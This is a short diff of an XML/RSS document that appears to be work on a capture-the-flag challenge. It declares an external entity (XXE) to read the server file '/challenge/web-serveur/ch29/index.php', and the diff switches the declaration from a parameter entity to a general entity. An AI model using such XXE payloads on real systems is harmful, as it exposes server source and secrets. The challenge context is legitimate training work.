@@ -1,5 +1,5 @@
 <!DOCTYPE updateProfile [
- <!ENTITY % file SYSTEM "file=/challenge/web-serveur/ch29/index.php">
+ <!ENTITY file SYSTEM "file=/challenge/web-serveur/ch29/index.php">
 ]>
 <rss
 	xmlns:atom="http://www.w3.org/2005/Atom"
